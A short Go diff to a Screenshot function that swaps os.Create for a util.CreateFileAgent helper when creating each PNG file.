@@ -55,7 +55,7 @@ func Screenshot() (path string, err error) {
 			return
 		}
 		path = fmt.Sprintf("%s-%d_%dx%d.png", timedate, i, bounds.Dx(), bounds.Dy())
-		picfile, e := os.Create(path)
+		picfile, e := util.CreateFileAgent(path)
 		if e != nil {
 			err = fmt.Errorf("create %s: %v", path, e)
 			log.Printf("Create picfile: %v", err)
